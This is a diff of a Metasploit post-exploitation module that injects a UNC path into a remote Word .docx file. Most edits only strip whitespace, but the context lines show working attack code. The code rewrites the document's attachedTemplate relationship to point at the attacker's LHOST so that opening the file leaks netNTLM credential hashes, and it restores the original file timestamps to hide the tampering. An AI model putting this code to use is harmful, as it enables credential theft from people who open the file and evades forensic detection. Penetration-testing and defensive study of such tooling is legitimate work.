@@ -19,9 +19,9 @@ class Metasploit3 < Msf::Post
 		super(update_info(info,
 			'Name'           => 'Microsoft Word UNC Path Injector',
 			'Description'    => %q{
-					This module modifies a remote .docx file that will, upon opening, submit 
-				stored netNTLM credentials to a remote host. Verified to work with Microsoft 
-				Word 2003, 2007 and 2010 as of January 2013. In order to get the hashes 
+					This module modifies a remote .docx file that will, upon opening, submit
+				stored netNTLM credentials to a remote host. Verified to work with Microsoft
+				Word 2003, 2007 and 2010 as of January 2013. In order to get the hashes
 				the auxiliary/server/capture/smb module can be used.
 			},
 			'License'        => MSF_LICENSE,
@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Post
 					'SphaZ <cyberphaz[at]gmail.com>'
 				]
 		))
-		
+
 		register_options(
 			[
 					OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to']),
@@ -55,13 +55,13 @@ class Metasploit3 < Msf::Post
 			print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
 			print e.message
 		end
-		return mace		
+		return mace
 	end
 
-	#using Tempfile does not work, because if Ruby garbage collects they are gone before we can use it, so we do it manually	
+	#using Tempfile does not work, because if Ruby garbage collects they are gone before we can use it, so we do it manually
 	def write_tmp(filedata)
 		tmp = File.join(Dir.tmpdir, Time.now.to_i.to_s + rand(5555).to_s)
-		File.open(tmp, 'w') {|f| f.write(filedata) }
+		File.open(tmp, 'wb') {|f| f.write(filedata) }
 		return tmp
 	end
 
@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Post
 			print_error("Backup directory #{datastore['BACKUPDIR']} does not exist.")
 			return nil
 		end
-		
+
 		#basename wont work, so we do it the regex way
 		if session.platform.include?'win'
 			tempname = datastore['FILE'].split("\\").last
@@ -80,32 +80,32 @@ class Metasploit3 < Msf::Post
 			tempname = datastore['FILE'].split("/").last
 		end
 
-		dst_filename = File.join(datastore['BACKUPDIR'], tempname)    
+		dst_filename = File.join(datastore['BACKUPDIR'], tempname)
 		begin
 			File.open(dst_filename,'wb') {|f| f.write(zipfile)}
 			return dst_filename
 		rescue
 			print_error("Error saving backup file to #{datastore['BACKUPDIR']}.")
-			return nil			
+			return nil
 		end
 	end
 
-	#here we unzip into memory, inject our UNC path, store it in a temp file and 
+	#here we unzip into memory, inject our UNC path, store it in a temp file and
 	#return the modified zipfile name for upload
 	def manipulate_file(zipfile)
 		ref = "<w:attachedTemplate r:id=\"rId1\"/>"
-		
+
 		rels_file_data = ""
 		rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
 		rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
 		rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
 		rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
-	
+
 		zip_data = unzip_docx(zipfile)
 		if zip_data.nil?
 			return nil
 		end
-		
+
 		#file to check for reference file we need
 		file_content = zip_data["word/settings.xml"]
 		if file_content.nil?
@@ -145,7 +145,7 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	#RubyZip sometimes corrupts the document when manipulating inside a 
+	#RubyZip sometimes corrupts the document when manipulating inside a
 	#compressed document, so we extract it with Zip::ZipFile into memory
 	def unzip_docx(zipfile)
 		vprint_status("Extracting #{datastore['FILE']} into memory.")
@@ -163,14 +163,14 @@ class Metasploit3 < Msf::Post
 		return zip_data
 	end
 
-	#making the actual docx we write to a temp file, 
+	#making the actual docx we write to a temp file,
 	#because upload_file needs a file as source
 	def zip_docx(zip_data)
 		docx = Rex::Zip::Archive.new
 		zip_data.each_pair do |k,v|
 			docx.add_file(k,v)
 		end
-		
+
 		tmp_file_name = write_tmp(docx.pack)
 		return tmp_file_name
 	end
@@ -196,7 +196,7 @@ class Metasploit3 < Msf::Post
 			print_error("Remote file does not exist!")
 			return
 		end
-		
+
 		#get mace values so we can put them back after uploading. We do this first, so we have the original
 		#accessed time too.
 		file_mace = get_mace
@@ -215,27 +215,26 @@ class Metasploit3 < Msf::Post
 			print_error("Error reading remote file.")
 			return
 		end
-		
-		
+
 		#Create local backup of remote file if wanted else a temp file
 		#Either way we need a local file to use because you cannot extract a zipfile into memory.
 		if datastore['BACKUP']
 			backup_filename = make_backup(zipfile)
 			if backup_filename.nil?
-				return 
+				return
 			else
 				print_status("Local backup of original file stored at #{backup_filename}.")
 				tmp_zipfile = backup_filename
 			end
 		else #no backup, so we use a temporary file instead
 				print_warning("Not storing a local backup of original file!")
-				tmp_zipfile = write_tmp(zipfile)		
+				tmp_zipfile = write_tmp(zipfile)
 		end
-		
+
 		#Unzip, insert our UNC path, zip and return the filename of the injected temp file for upload
 		modified_zip_name = manipulate_file(tmp_zipfile)
 		if modified_zip_name.nil?
-			return	
+			return
 		end
 
 		#upload the injected file
@@ -246,7 +245,7 @@ class Metasploit3 < Msf::Post
 			print_error("Error uploading file to #{datastore['FILE']}: #{e.class} #{e}")
 			return
 		end
-		
+
 		#cleanup of local temp files
 		FileUtils.rm(modified_zip_name)
 		if not datastore['BACKUP']
@@ -262,7 +261,7 @@ class Metasploit3 < Msf::Post
 			note_string += " Local backup of file at #{backup_filename}."
 		end
 
-		report_note(:host => session.session_host, 
+		report_note(:host => session.session_host,
 		:type => "host.word_unc_injector.changedfiles",
 		:data => {
 			:session_num => session.sid,
